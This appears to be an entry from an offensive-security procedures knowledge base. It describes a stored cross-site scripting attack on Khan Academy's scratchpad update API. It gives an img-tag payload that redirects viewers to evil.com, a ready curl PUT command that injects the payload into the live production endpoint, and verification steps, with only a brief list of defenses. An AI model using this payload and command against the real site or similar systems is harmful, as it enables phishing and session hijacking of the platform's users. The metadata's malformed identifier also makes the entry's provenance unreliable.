---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - xss
  - injection
  - javascript
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-put-project-update]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:37.226Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-into-Project-Update

## Summary

This procedure modifies the Khan Academy project update request to inject malicious JavaScript within an HTML element, exploiting insufficient sanitization to store an XSS payload for later execution.

## Description

The attack targets the PUT /api/internal/scratchpads/ID endpoint, where the request body includes project content. By embedding JavaScript in an <img> tag's onload or onerror attribute, such as a redirect to an external phishing site, the payload persists in the project. When viewed, it executes in the browser context, potentially leading to session hijacking. Requires authenticated access to the platform.

## Requirements

1. Authenticated Khan Academy session (cookies or tokens)
2. Project ID from a created document
3. Proxy or curl for request modification

## Defense

Defensive measures and detection strategies:

- Enforce strict input validation and HTML escaping on API endpoints
- Use Web Application Firewall (WAF) to block script tags and event handlers
- Audit project content for malicious patterns

## Objectives

1. Successfully submit tainted project update
2. Store JavaScript payload without rejection
3. Enable execution on subsequent views

## Instructions

### Step 1: Prepare the Malicious Payload

**Context**: Craft JavaScript to inject, e.g., for redirection.

Create payload like: <img src="x" onload="window.location='https://evil.com'">

**Expected Output**: Valid HTML snippet with embedded script.

### Step 2: Intercept and Modify Request

**Context**: Alter the PUT request body to include the payload.

Use Burp Suite or execute [[commands/curl-put-project-update]] with the modified body:

```bash
curl -X PUT -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"content": "<img src=\"x\" onload=\"window.location=\'https://evil.com\';\">"}' https://www.khanacademy.org/api/internal/scratchpads/ID
```

> This sends the tainted content; expect 200 OK if successful.

### Step 3: Verify Injection

**Context**: Check if the project updates with the payload.

Retrieve and view the project source to confirm the script is stored.

**Expected Output**: Payload visible in project HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-put-project-update]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[injection]]
